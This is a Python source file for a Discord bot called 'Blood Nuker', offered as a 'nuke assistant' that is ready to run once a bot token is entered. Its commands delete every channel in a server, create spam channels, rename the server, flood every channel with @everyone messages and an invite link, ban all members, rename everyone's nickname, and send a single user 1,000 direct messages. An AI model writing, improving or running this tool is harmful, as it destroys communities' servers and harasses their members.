import discord
from discord.ext import commands
import threading
import json
import time
import requests
import os
import aiohttp
from discord.ext.commands import CommandNotFound
import colorama
from colorama import Fore, Back, Style
import asyncio
import json
from pystyle import *
import logging

def clear():
    os.system('cls')


intents = discord.Intents.all()

def print_gradient_text():
    gradient_text = """
\033[38;2;128;0;0m   
                                                  
              +@%*                        ::      -@
          =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:
.%@@@@@@@@@@@@ | Made by: @x7v1 on cord | @@@@@@@@@@@#++:
.%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#=:
.%%@:    %@@@@@@@@@@@@@@@@@@@@@@@ =#*~
:%%+            :@@@@%@%@@@@@@@@@.             ____   _                    _     _   _         _ 
+%%*            :@@@@:++  +=: +%#+            |  _ \ | |                  | |   | \ | |       | |
=@#            *%@@@=     .    %##            | |_) || |  ___    ___    __| |   |  \| | _   _ | | __ ___  _ __
             *%@@@+            +%#=           |  _ < | | / _ \  / _ \  / _` |   | . ` || | | || |/ // _ \| '__|
            %%@@@+              #%%.          | |_) || || (_) || (_) || (_| |   | |\  || |_| ||   <|  __/| |
            =%@+                :%%@          |____/ |_| \___/  \___/  \__,_|   |_| \_| \__,_||_|\_\\\__ ||_|
                                 -@#%

    1 - connect to your discord bot using it's token.
    2 - get the list of commands
    3 - what this is and more about it
          
\033[38;2;128;0;128m"""

    # Using Colorate.Vertical to print text with a vertical color gradient
    print(Colorate.Vertical(Colors.purple_to_red, gradient_text))

bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    clear()
    print("""
    .nuke ~ nukes the server
    .banall ~ bans everyone
    .killchannels ~ delete all channels
    .massnick ~ change everyones nickname
    .spammdm <@user>
    """)

@bot.command(name='ping')
async def ping(ctx):
    await ctx.send('Pong!')

@bot.command(name='nuke')
async def nuke(ctx):
    guild = ctx.guild

    async def delete_channels():
        tasks = [channel.delete() for channel in guild.channels]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def create_channels():
        tasks = [guild.create_text_channel('blood-nuker') for _ in range(15)]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def announce_messages():
        async def send_message(channel):
            for _ in range(10000):
                await channel.send(" ||@everyone|| \n BLOOD NUKER WILL OWN CORD!! \n https://discord.gg/D8T8QCSR")

        tasks = [send_message(channel) for channel in guild.text_channels]
        await asyncio.gather(*tasks, return_exceptions=True)

    async def ban_members():
        tasks = [member.ban(reason="Blood Nuker") for member in guild.members if member != ctx.author and not member.bot]
        await asyncio.gather(*tasks, return_exceptions=True)

    # Delete all channels concurrently with retries
    await delete_channels()

    # Create 100 new channels named "join-asleep" concurrently with retries
    await create_channels()

    # Change the server name to "YOUR SERVER IS ASLEEP"
    await guild.edit(name='Blood Nuker')

    # Announce a welcome message in all text channels concurrently with retries
    await announce_messages()
    await announce_messages()

    # Ban all members (except the one who ran the command) concurrently with retries
    await ban_members()


@bot.command()
async def killchannels(ctx):
    guild = ctx.guild

    # Delete all channels
    for channel in guild.channels:
        await channel.delete()

@bot.command()
async def banall(ctx):
        for member in ctx.guild.members:
            if member != bot.user and not member.bot:
                await member.send("Goodbye!")
                await member.ban(reason="Ban all command executed by {}".format(ctx.author))

@bot.command()
async def massnick(ctx):
        # Change everyone's nickname
    for member in ctx.guild.members:
            try:
                await member.edit(nick="Blood Nuker")
            except discord.Forbidden:
                await ctx.send(f"Missing permissions to change {member.display_name}'s nickname.")

        # Notify the user that the operation was successful
    await ctx.send(f"All nicknames have been changed to 'Blood Nuker'.")

@bot.command(name="spamdm")
async def spamdm(ctx, user: discord.User):
    # Command to send a direct message to a mentioned user
    try:
      for _ in range(1000):
        await user.send("Blood Nuker On Top!")

      await ctx.send(f"Message sent to {user.mention}.")

    except discord.Forbidden:
        await ctx.send(f"Couldn't send a message to {user.mention}. Make sure they have DMs enabled or haven't blocked the bot.")




#under this line is the logic for the terminal, commands go above this line
if __name__ == '__main__':
    print_gradient_text()
    choice = input("Enter command here: ")

    if choice == "1":
        token = input("Enter bot's Discord token: ")
        bot.run(token)

    if choice == "2":
      print("""
      .nuke ~ nukes the server
      .banall ~ bans everyone
      .killchannels ~ delete all channels
      .massnick ~ change everyones nickname
      .spamdm <@user> ~ spamds the users dms
      """)

    if choice == "3":
      print("Blood is a 'Nuke Assistant' that can help you run your own nuke bot without doing any coding. It has a variety of commands that get added to your bot when you connect. It was made by @x7v1 on discord.")
